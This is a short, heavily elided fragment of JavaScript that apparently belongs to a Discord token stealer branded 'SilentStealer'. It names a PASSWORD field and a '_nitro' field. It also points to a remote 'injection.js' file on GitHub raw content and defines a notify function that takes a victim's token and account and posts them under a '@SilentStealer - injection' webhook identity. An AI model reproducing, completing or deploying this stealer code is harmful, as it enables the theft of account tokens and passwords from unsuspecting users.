...
let [
    ...
    PASSWORD
        ...
        "https://raw.githubusercontent.com/Agonyxxx/Injection/main/injection.js",
        {
            _nitro: [
...
const notify = async (ctx, token, acc) => {
    ...
    ctx.username = "@SilentStealer - injection";
    ctx.avatar_url = "https://i.imgur.com/1mQiY9e.gif";
